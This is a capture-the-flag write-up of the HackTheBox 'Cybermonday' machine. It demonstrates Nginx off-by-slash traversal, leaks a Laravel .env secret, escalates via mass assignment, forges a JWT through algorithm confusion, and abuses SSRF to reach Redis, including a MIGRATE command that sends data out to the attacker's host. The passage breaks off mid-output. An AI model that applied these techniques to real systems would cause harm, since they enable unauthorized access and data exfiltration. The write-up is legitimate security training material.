---
layout: post
title: HTB - Cybermonday
date: 2023-12-05 12:48 +0200
categories: [HTB Machines]
tags: [nmap,php,laravel,off-by-slash,Nginx,gitdumper,source-code,mass-assignment,api,jwt,jwks,python-jwt,jwt-tool,jwt-algorithm-confusion,ssrf,redis,laravel-deserialization,Deserialization,netstat,phpggc,docker,container,pivot,chisel,docker-registry,snyk,directory-traversal,docker-compose,docker-apparmor]  
image: /assets/img/hackthebox/machines writeups/Cybermonday/Cover.png
---


## **Summary**

CyberMonday starts with a website that is hosted using `Nginx` and created using `Laravel` as a PHP framework. The Nginx configuration was suffering from `nginxoffbyslash`, which occurs when an Nginx directive does not end with a slash. This allows us to access the `.git` directory, `.env` file and retrieve the website's Laravel code. By reviewing the code, we spot a way to escalate a user to an `admin` using the update function through `mass assignment` vulnerability then found a new subdomain for a webhooks API.By abusing `jwt algorithm confusion` we can get and admin access to create webhooks. One of webhooks is vulnerabile to `SSRF`. By abusing this `SSRF` interact with the Redis database that’s caching the Laravel session data. I’ll abuse that to get code execution in the web container. after that i found a `Docker Registry` container and pull the API container image. The Source code review shows additional API endpoints by abusing those to get file read on the API container and leak the password of a user that works for SSH. Then abuse a script designed to allow a user to run docker compose in a safe way to create a privilege container to get us root access.


## **Machine Info**

|                      |                                                                                                  |
|:--------------------:|:------------------------------------------------------------------------------------------------:|
| **Box Name**         |  Cybermonday                                                                                        |
| **OS**               |  ![](/assets/img/hackthebox/machines writeups/Cybermonday/linux_penguin.png){: w="35" h="30" }      |
| **Difficulty**       |  High                                                                                            |
| **Graph**            |  ![](/assets/img/hackthebox/machines writeups/Cybermonday/graph.png)                                |
| **Points**           |  40                                                                                              |
| **Release Date**     |  19 Aug 2023                                                                                 |
| **Retire Date**      |  02 Dec 2023                                                                              |




## **Recon**

### **Nmap**

Using `Nmap` to enumerate all open ports and services by doing this on two phases to speed things up :

- **Phase 1 :** Make a simple scan to check for all opened `TCP` ports with high rate of checking port equel to 10000.
- **Phase 2 :** After idetify the open ports start the sec phase to fingerprint (services, versions, etc) for each open port.


```console
# Fast scan to check open ports
(kali㉿kali)-[~/HTB/HTB Machines/Cybermonday]$ nmap -p- --min-rate 10000 10.10.11.228
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-02 06:51 EST
Nmap scan report for cybermonday.htb (10.10.11.228)
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds

# Detailed Scan for spesfic open ports     
(kali㉿kali)-[~/HTB/HTB Machines/Cybermonday]$ nmap -A -p 22,80 -sC 10.10.11.228
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-02 06:52 EST
Nmap scan report for cybermonday.htb (10.10.11.228)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)
|   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)
|_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)
80/tcp open  http    nginx 1.25.1
|_http-title: Welcome - Cyber Monday
|_http-server-header: nginx/1.25.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```
{: .nolineno }


`nmap` finds the following TCP ports:
- **SSH** - 22 
- **HTTP** - 80 with 



### **HTTP Cybermonday.htb - TCP 80**

The home page of the website redirect to Cybermonday.htb. so we have to add this hostname in `/etc/hosts`

![](/assets/img/hackthebox/machines writeups/Cybermonday/redirect.png)

```console
(kali㉿kali)-[~]$ cat /etc/hosts                 
127.0.0.1       localhost 
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.228    Cybermonday.htb
```

The application allow user to register new accounts to be used to login to it.

![](/assets/img/hackthebox/machines writeups/Cybermonday/register.png)

After login found that the user can do only two things :
- View the products 
- Update his informations (pass,email,etc).

![](/assets/img/hackthebox/machines writeups/Cybermonday/products.png)
![](/assets/img/hackthebox/machines writeups/Cybermonday/update-info.png)


#### **Nginx off by slash**

I always love to run few scanner and fuzzing tools in the background while doing manual testing. One of those tools is `Nuceli` i run it in the background to check for any exposed config files and i found that the nginx confiueration is vuerlanble to nginx `off-by-slash`.

```console
(kali㉿kali)-[~]$ echo http://cybermonday.htb|~/go/bin/nuclei -t ~/nuclei-templates/http/exposures/configs/ -silent                               
[git-config-nginxoffbyslash] [http] [medium] http://cybermonday.htb/assets../.git/config
```

Nginx `off-by-slash` is happend when a Nginx directive does not end with a slash, it is possible to traverse one step up.

**Example OffBySlash**

The following `/files` endpoint has no trailing slash, while the alias parameter has a trailing slash.
```config               
location /files {
    alias /home/kali/files/;
    autoindex on;
    default_type text/plain;
}
```
The setting as above is commonly known as an off-by-slash misconfiguration.
In this case, an attacker can access files in `/home/kali` directory via `/files../` endpoint.

**Exploit** : you can browse the contents of `/home/kali/.bashrc` by accessing `https://TargetWebsite/files../.bashrc`.

Since this website is made using Laravel framwork i know that Laravel saves the APP it uses to encrypt the cookies and other credentials inside a file called `.env` so let's trying to get by abusing `OffBySlash`

```console
wget http://cybermonday.htb/assets../.env
--2023-12-02 11:42:24--  http://cybermonday.htb/assets../.env
Resolving cybermonday.htb (cybermonday.htb)... 10.10.11.228
Connecting to cybermonday.htb (cybermonday.htb)|10.10.11.228|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1081 (1.1K) [application/octet-stream]
Saving to: ‘.env’

.env                              100%[============================================================>]   1.06K  --.-KB/s    in 0.07s   

2023-12-02 11:42:25 (14.8 KB/s) - ‘.env’ saved [1081/1081]
```
{: .nolineno }

#### **.env**

```console
(kali㉿kali)-[~]$ cat .env
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb

LOG_CHANNEL=stack
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=db
DB_PORT=3306
DB_DATABASE=cybermonday
DB_USERNAME=root
DB_PASSWORD=root

BROADCAST_DRIVER=log
CACHE_DRIVER=file
FILESYSTEM_DISK=local
QUEUE_CONNECTION=sync
SESSION_DRIVER=redis
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"

CHANGELOG_PATH="/mnt/changelog.txt"

REDIS_BLACKLIST=flushall,flushdb 
```

The information here is very subtle, but there is some:

- The `APP_KEY` will be useful if I get an opportunity for a deserialization attack.
- There’s creds to the MySQL database :
  - DB_USERNAME = root
  - DB_PASSWORD = root



#### **Git Repository**

Dumping the `/.git` repo content using [git-dumper](https://github.com/arthaud/git-dumper).


```console
(kali㉿kali)-[~]$ python3.11 ~/Tools/git-dumper/git_dumper.py http://cybermonday.htb/assets../.git/ git
[-] Testing http://cybermonday.htb/assets../.git/HEAD [200]
[-] Testing http://cybermonday.htb/assets../.git/ [403]
[-] Fetching common files
[-] Fetching http://cybermonday.htb/assets../.git/COMMIT_EDITMSG [200]
[-] Fetching http://cybermonday.htb/assets../.git/description [200]
[-] Fetching http://cybermonday.htb/assets../.git/hooks/post-update.sample [200]
...[snip]...

[-] Fetching http://cybermonday.htb/assets../.git/refs/wip/wtree/refs/heads/master [404]
[-] http://cybermonday.htb/assets../.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/refs/wip/index/refs/heads/master [404]
[-] http://cybermonday.htb/assets../.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://cybermonday.htb/assets../.git/objects/9e/86521722b083582f0f100e7b4d3a63bcc1bdfc [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a0/a2a8a34a6221e4dceb24a759ed14e911f74c57 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/88/cadcaaf281f473a7d03d757be46a6d1d307eaf [200]
...[snip]...

[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/3e4a3f9c394c636dcf0fe673ddb42c2fa180c3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0e/d15f710f3fdd9cd4255795cedb4f4e61aa59e8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e3/dff6b7c1c86ad0a72845e554d4fffecff9f6b5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f0/0a628d46a5fb12ee6f4fb81647ad94ded4246c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/32/e46a3cd15b9aa54cccc46fc53990f382062325 [200]
[-] Running git checkout .
```
{: .nolineno }

This as we can see dump the content of the git repo to a directory called git

![](/assets/img/hackthebox/machines writeups/Cybermonday/git.png)



#### **Laravel Source Code Analysis**

Now it's time to check the Laravel code if you are not familiar with Laravel directory structure you can follow this [link](https://laravel.com/docs/10.x/structure#the-database-directory).


##### **Routes web.php**

Starting with `web.php` file which contains routes that the `RouteServiceProvider` places in the web middleware group. If your application does not offer a stateless, RESTful API then all your routes will most likely be defined in the web.php file.

```php
Route::get('/', function () {
    return view('welcome',['title' => 'Welcome']);
})->name('welcome');

Route::get('/products',[ProductController::class,'index'])->name('products');
Route::get('/product/{product:id}',[ProductController::class,'show'])->name('products.show');

Route::get('/logout',[AuthController::class,'destroy'])->name('logout');

Route::middleware('guest')->group(function(){

    Route::get('/signup',[AuthController::class,'registerForm'])->name('register.form');
    Route::post('/signup',[AuthController::class,'register'])->name('register');
    Route::get('/login',[AuthController::class,'loginForm'])->name('login.form');
    Route::post('/login',[AuthController::class,'login'])->name('login');

});

Route::prefix('home')->middleware('auth')->group(function(){

    Route::get('/',[HomeController::class,'index'])->name('home');

    Route::get('/profile',[ProfileController::class,'index'])->name('home.profile');
    Route::post('/update',[ProfileController::class,'update'])->name('home.profile.update');

});

Route::prefix('dashboard')->middleware('auth.admin')->group(function(){
        
    Route::get('/',[DashboardController::class,'index'])->name('dashboard');

    Route::get('/products',[ProductController::class,'create'])->name('dashboard.products');
    Route::post('/products',[ProductController::class,'store'])->name('dashboard.products.store');
    
    Route::get('/changelog',[ChangelogController::class,'index'])->name('dashboard.changelog');

});
```

By reviewing the code we can found that most of the routes are already known for us except single one which is `dashboard` and when we trying to accessing it we got the following :

- **Case 1 we logged in :** Redirect to Home page


![](/assets/img/hackthebox/machines writeups/Cybermonday/home-redirect.png)


- **Case 2 we logged out :** Get error page


![](/assets/img/hackthebox/machines writeups/Cybermonday/error.png)

As per the error page there is an attempt to read property "isAdmin" on null. This means that there is an admin user which has priv to accessing the dashboard page so keep that in mind because this is a potential Priv Esclation we have to check later.

#### **Admin Access**

##### **Controllers**

Controllers are in `app/Http/Controllers`. And the update function is in this file `ProfileController.php` which conatins the following code 


```php
class ProfileController extends Controller
{
    public function index()
    {
        return view('home.profile', [
            'title' => 'Profile'
        ]);
    }

    public function update(Request $request)
    {
        $data = $request->except(["_token","password","password_confirmation"]);
        $user = User::where("id", auth()->user()->id)->first();

        if(isset($request->password) && !empty($request->password))
        {
            if($request->password != $request->password_confirmation)
            {
                session()->flash('error','Password dont match');
                return back();
            }

            $data['password'] = bcrypt($request->password);
        }

        $user->update($data);
        session()->flash('success','Profile updated');

        return back();
    }
}
```

##### **Mass Assignment**

The previous code gets the current User object, and updates the data. However, there’s a mass assignment vulnerability here! 
- **Line 12 :** It takes all the POST request fields except for `_token`, `password`, and `password_confirmation`, because those data will not be inserted in the DB.
- **Line 15 :** Since it's not storing the password in the data object so it will retrive it from the request `$request->password` to check if it not spplied or empty.
- **Line 23** After the check is pass it will encrypt the pass and add it to the data object.
- **Line 26** Then Update the DB with all supplied info which stored in the `$data` at **line 12** 

According to this the code is just take the input from the user and update the DB with those data except for `_token`, `password`, and `password_confirmation` so this allow us to esclate priv by changing the content of the `isAdmin` part

![](/assets/img/hackthebox/machines writeups/Cybermonday/admin-attempt1.png)

As we can see when set `isAdmin` to true the error reveal that it accepts only integer value so i set it to `1` and it's works now we are admin.

![](/assets/img/hackthebox/machines writeups/Cybermonday/admin-attempt2.png)

![](/assets/img/hackthebox/machines writeups/Cybermonday/admin-success.png)

#### **Changelog**

One of the links in the dashboard is to `Changelog` (/dashboard/changelog):


![](/assets/img/hackthebox/machines writeups/Cybermonday/changelog.png)

Which reveal There’s also a link to a webhook url on `http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77`. That’s a new subdomain so let's add it to `/etc/hosts`

```console
(kali㉿kali)-[~]$ cat /etc/hosts                 
127.0.0.1       localhost 
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.228    Cybermonday.htb webhooks-api-beta.cybermonday.htb
```

### **HTTP Webhooks-api-beta.cybermonday.htb - TCP 80**

Accessing root directory of the subdomain reveals that it is a running a PHP

```http
HTTP/1.1 200 OK
Server: nginx/1.25.1
Date: Sat, 02 Dec 2023 18:11:28 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=99514fb0b303410089da6bc22d58142b; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 482
```

#### **Webhooks**


Trying just `/webhooks` which returns an unauthorized error


```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks
{"status":"error","message":"Unauthorized"}
```

Since the response of the page is json so let's use `jq` to make it more pretty. As we can see the response is like an API documentation


```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb -s | jq .
{
  "status": "success",
  "message": {
    "routes": {
      "/auth/register": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/auth/login": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/webhooks": {
        "method": "GET"
      },
      "/webhooks/create": {
        "method": "POST",
        "params": [
          "name",
          "description",
          "action"
        ]
      },
      "/webhooks/delete:uuid": {
        "method": "DELETE"
      },
      "/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }
    }
  }
}
```

Trying to login with my old creds on the website but i got the user not define

```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/auth/login -d 'username=0xRyuzak1&password=P@ssw0rd'
{"status":"error","message":"\"username\" not defined"}
```

After some struggle i findout that since this is API and most of APIs using json so i have to switch to it and it's working.

```console
(kali㉿kali)-[~]$  curl http://webhooks-api-beta.cybermonday.htb/auth/login -H "Content-Type: application/json" -d '{"username": "0xRyuzak1", "password": "P@ssw0rd"}' 
{"status":"error","message":"Invalid Credentials"}
```

Let's trying to register new user using `auth/register`.

```console
(kali㉿kali)-[~]$  curl http://webhooks-api-beta.cybermonday.htb/auth/register -H "Content-Type: application/json" -d '{"username": "0xRyuzak1", "password": "P@ssw0rd"}' 
{"status":"success","message":"success"}
```

Now trying to login again and it works .

```console
(kali㉿kali)-[~]$  curl http://webhooks-api-beta.cybermonday.htb/auth/login -H "Content-Type: application/json" -d '{"username": "0xRyuzak1", "password": "P@ssw0rd"}' 
{"status":"success","message":{"x-access-token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoidXNlciJ9.Qynd3c-rI1gU335NZjo0MSq43-_YkkMuh2TZ1jOPMbZG_B4LEX1O6Asot8JJcocWXuxlL29HZOcDvK8YMkZifEv29XAKGUXmTTiGnYf4ajgnAHFQx62Ww2XKL26XISO1Z6ZnS0InP9wzgSJZYtZbROMrl1wHz4ZyQqH4-27N0JWVvIA3rzloHdcWiK65gJ7XwUjBpL4WoifDZ0pz_ozsnz5dl6spKqRB388RUgFyVcbpEbJ8DVC7JqtZn6Cco1ldaBv1HyZ5aOzWSY7XjxQj_gSvv03FsqfeDuXV7n_FMIpdZQSRAmldSk_XyS8SRP5EI4hXREuQxelpjn5QDB_5OQ"}} 
```

let's trying access webhook dir again 

```console
(kali㉿kali)-[~]$  curl -s http://webhooks-api-beta.cybermonday.htb/webhooks -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoidXNlciJ9.Qynd3c-rI1gU335NZjo0MSq43-_YkkMuh2TZ1jOPMbZG_B4LEX1O6Asot8JJcocWXuxlL29HZOcDvK8YMkZifEv29XAKGUXmTTiGnYf4ajgnAHFQx62Ww2XKL26XISO1Z6ZnS0InP9wzgSJZYtZbROMrl1wHz4ZyQqH4-27N0JWVvIA3rzloHdcWiK65gJ7XwUjBpL4WoifDZ0pz_ozsnz5dl6spKqRB388RUgFyVcbpEbJ8DVC7JqtZn6Cco1ldaBv1HyZ5aOzWSY7XjxQj_gSvv03FsqfeDuXV7n_FMIpdZQSRAmldSk_XyS8SRP5EI4hXREuQxelpjn5QDB_5OQ" |jq .
{
  "status": "success",
  "message": [
    {
      "id": 1,
      "uuid": "fda96d32-e8c8-4301-8fb3-c821a316cf77",
      "name": "tests",
      "description": "webhook for tests",
      "action": "createLogFile"
    },
    {
      "id": 2,
      "uuid": "218e20e1-3153-4d1b-833c-4fba689dbd29",
      "name": "captainHook",
      "description": "not the crocodile!",
      "action": "sendRequest"
    },
    {
      "id": 3,
      "uuid": "879c0367-12f3-4b7f-8d94-d292334aefdb",
      "name": "file",
      "description": "we never knwo -_-",
      "action": "createLogFile"
    },
    {
      "id": 4,
      "uuid": "44dbe782-4a35-456e-8130-6a15f459d156",
      "name": "test24062",
      "description": "test",
      "action": "sendRequest"
    },
    {
      "id": 5,
      "uuid": "2fe5b292-ddb4-46e9-a755-c227117ae5a5",
      "name": "test78745",
      "description": "test",
      "action": "sendRequest"
    }
  ]
}
```

But when I trying to create one using `/webhooks/create` or other webhooks endpoints i just got unauthorized

```console
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -d '{"name": "0xRyuzak1_webhook", "description": "Anything", "action": "createLogFile"}' -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoidXNlciJ9.Qynd3c-rI1gU335NZjo0MSq43-_YkkMuh2TZ1jOPMbZG_B4LEX1O6Asot8JJcocWXuxlL29HZOcDvK8YMkZifEv29XAKGUXmTTiGnYf4ajgnAHFQx62Ww2XKL26XISO1Z6ZnS0InP9wzgSJZYtZbROMrl1wHz4ZyQqH4-27N0JWVvIA3rzloHdcWiK65gJ7XwUjBpL4WoifDZ0pz_ozsnz5dl6spKqRB388RUgFyVcbpEbJ8DVC7JqtZn6Cco1ldaBv1HyZ5aOzWSY7XjxQj_gSvv03FsqfeDuXV7n_FMIpdZQSRAmldSk_XyS8SRP5EI4hXREuQxelpjn5QDB_5OQ" 
{"status":"error","message":"Unauthorized"}
```

#### **JWT Algorithm Confusion**

Check the content of the JWT using [Jwt.io](https://jwt.io/)

![](/assets/img/hackthebox/machines writeups/Cybermonday/jwt.png)

As we can see the role that is currently user as well as my username. The header shows that it’s using public key crypto to validate tokens. 

Think of `RS256` like `Oauth` if you want to use the jwt for many apps but without shareing the secret so there have to be public key to validate the token.

The public key well known path is `jwks.json` so let's give it a try.

```console
(kali㉿kali)-[~]$ curl -s http://webhooks-api-beta.cybermonday.htb/jwks.json |jq .
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",                                                 
      "e": "AQAB"
    }
  ]
}
```

Using the this [link](https://8gwifi.org/jwkconvertfunctions.jsp) we can convert our JWKs paramter into a valid usable Public Key

![](/assets/img/hackthebox/machines writeups/Cybermonday/jwks-key.png)

Then convert this key to base64 to use it in [Jwt.io](https://jwt.io/)

```console
(kali㉿kali)-[~]$ base64 -w 0 key.pub
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwdmV6dkFLQ09neHdzaXlWNlBSSgpmR011bCtXQllvcndGSVd1ZFdLa0dlak14M29uVVNsTThPQTNQam1oRk5DUC84ako3V0EyZ0RhOG9QM04ySjh6CkZ5YWRucnQyWGU1OUZkY0xYVFB4YmJmRkMwYVRHa0RJT1BaWUo4a1IwY2x5MGZpWmlaYmc0Vkxzd1lzaDNTbjcKOTdJbElZcjZXcWZjNlpQbjFuc0VoT3J3TytxU0Q0UTI0RlZZZVV4c243cEowb09XSFBEK3F0QzVxM0JSMk0vUwp4QnJ4WGg5dnFjTkJCM1pSUkEwSDBGRGRWNkxwLzh3Slk3UkI4ZU1SRWdTZTQ4cjNrN0dsRWNDTHdic3lDeWhuCmd5c2dIc3E2eUpZTTgyQkw3VjhRbG40MnlpajFCTTdmQ3UxOU0xRVp3UjVlSjJIZzMxWnNLNXVTaGJJVGJSaDEKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

Now do the following on jwt.io:
- Change the `RS256` alg to `HS256` to perform the confusion
- Change the role from `user` to `admin`
- Toggle the secret base64 encoded 
- Provide the secret key

![](/assets/img/hackthebox/machines writeups/Cybermonday/jwt-admin.png)

Now we can create a new webhook using the new Admin Jwt token

```console
(kali㉿kali)-[~]$ curl -s http://webhooks-api-beta.cybermonday.htb/webhooks/create -d '{"name": "0xRyuzak1_Webhook", "description": "Anything", "action": "createLogFile"}' -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -H "Content-type: application/json" |jq .
{
  "status": "success",
  "message": "Done! Send me a request to execute the action, as the event listener is still being developed.",
  "webhook_uuid": "856c4626-dc1a-4961-b18f-f4663cd8eeb4"
```

#### **sendRequest SSRF**

After some struggle i created another webhook with action equel to `sendRequest`

```console 
(kali㉿kali)-[~]$ curl -s http://webhooks-api-beta.cybermonday.htb/webhooks/create -d '{"name": "0xRyuzak1_sendRequest", "description": "Anything", "action": "sendRequest"}' -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -H "Content-type: application/json" |jq .
{
  "status": "success",
  "message": "Done! Send me a request to execute the action, as the event listener is still being developed.",
  "webhook_uuid": "6652fb8e-1e05-46ea-9bbf-85a4b950602b"
```

Then i trying to access it using POST request with paramters `url` , `method` as described before in the root dir response  

I set the url to my netcat listener and i got connect from the Server side

```console 
(kali㉿kali)-[~]$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/6652fb8e-1e05-46ea-9bbf-85a4b950602b -d '{"url": "http://10.10.16.67/0xRyuzak1", "method": "GET"}' -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweFJ5dXphazEiLCJyb2xlIjoiYWRtaW4ifQ.3U0MVCH05YfKCfCnT1QFP5arPeKxXKjZenEqD1XgWsM" -H "Content-type: application/json"
{"status":"error","message":"URL is not live"}  
```

```console
(kali㉿kali)-[~]$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.16.67] from (UNKNOWN) [10.10.11.228] 36472
GET /0xRyuzak1 HTTP/1.1
Host: 10.10.16.67
Accept: */*
```

Check if the method parameter have some sort of verification or not

![](/assets/img/hackthebox/machines writeups/Cybermonday/method-check.png)

As we can see we can send anything we want without checks

## **Shell as www-data**

So now let's discuss what we gonna do because it is really complex attack path:
- Abusing sendRequest webhook to perform SSRF attack
- By SSRF we will talk locally to the `Redis` DB 
- Decrypt Laravel tokens using `APP_KEY` which we found before in `.env` file
- Create a Laravel PHP deserialization malcious object using phpgcc
- Insert the malcious `deserialization` object as the value for the Laravel session in Redis 
- Refresh the webapp to check if our deserialization attack works 

### **Local Redis**

Running my own Redis server in a Docker container in my kali machine and forward port 6379 on my VM to that port on the container . This local redis to used to help us to testing things local first and also as debugger


```console
(kali㉿kali)-[~]$ sudo docker run -p 6379:6379 redis
1:C 02 Dec 2023 21:23:46.191 # WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
1:C 02 Dec 2023 21:23:46.191 * oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
1:C 02 Dec 2023 21:23:46.191 * Redis version=7.2.3, bits=64, commit=00000000, modified=0, pid=1, just started
1:C 02 Dec 2023 21:23:46.191 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf
1:M 02 Dec 2023 21:23:46.192 * monotonic clock: POSIX clock_gettime
1:M 02 Dec 2023 21:23:46.192 * Running mode=standalone, port=6379.
1:M 02 Dec 2023 21:23:46.192 * Server initialized
1:M 02 Dec 2023 21:23:46.192 * Ready to accept connections tcp
```

Connect to it 

```console 
(kali㉿kali)-[~]$ redis-cli
127.0.0.1:6379>
```

Using this [Redis Doc](https://redis.io/commands/) to find the usefull commands which we are going to use :

- SET
- MIGRTATE

**SET Usage**

Using `SET` to normally create a key to hold the string value 

```console
# Syntax
SET key value 
# Example 
SET 0xRyuzak1 "Pentest"
```

![](/assets/img/hackthebox/machines writeups/Cybermonday/set-key.png)


**MIGRATE Usage**

We will using `MIGRATE` command. This command actually executes a DUMP+DEL in the source instance, and a RESTORE in the target instance. So it will help us to exfiltrate data to our local Redis.

```console
# Syntax
MIGRATE [host] [port] [key] [destination-db] [timeout] COPY REPLACE
# Example
MIGRATE 10.10.16.67 6379 0xRyuzak1 0 5000 COPY REPLACE
```

![](/assets/img/hackthebox/machines writeups/Cybermonday/out-of-band.png)


```console
(kali㉿kali)-[~]$ redis-cli
127.0.0.1:6379> keys *
1) "0xRyuzak1"
127.0.0.1:6379> get 0xRyuzak1
"Pentest"
```

### **Laravel Token**

Now let's decrypt laravel token in order to do that we have to get the following : 
- **IV** : The Initialization Vector is a random value that is used as an additional input to the encryption algorithm along with the encryption key
- **Key** : The secret key used for the encryption
- **Value**  : The Value is the actual encrypted data that you want to decrypt

Actually the `MAC` has no needs here for us in decryption it is just the Message Authentication Code is a cryptographic hash generated using a secret key

```console 
(kali㉿kali)-[~]$ echo 'eyJpdiI6IjlWYmxDdTArKyt0S2tkUzhKaEc4Z2c9PSIsInZhbHVlIjoiUCt6bXNLakVybmY1OEZVYkdiQnpoeTBuSlcxQVFqTnh5NXR2WTJEaktDdncvcEdoTnAwQUJpbm9pSmM3bjMvcVMrWEJGZzVWUjNEMjlrSTJLZmNLeEFsZnREMVlCdlZZaXJ2WDZYeWtpbGM2MTdJNnBVU3dLck9JeWgzVTZJTWQiLCJtYWMiOiI1MWM1ZjA1MWJhN2EzNTFhYjYxMjFkMTY0M2Y2MGQ4NmU4N2Q4M2FiNzQ0NDZkNWFmZmI2YjM3NzViYzgwYjc0IiwidGFnIjoiIn0=' | base64 -d | jq .
{
  "iv": "9VblCu0+++tKkdS8JhG8gg==",
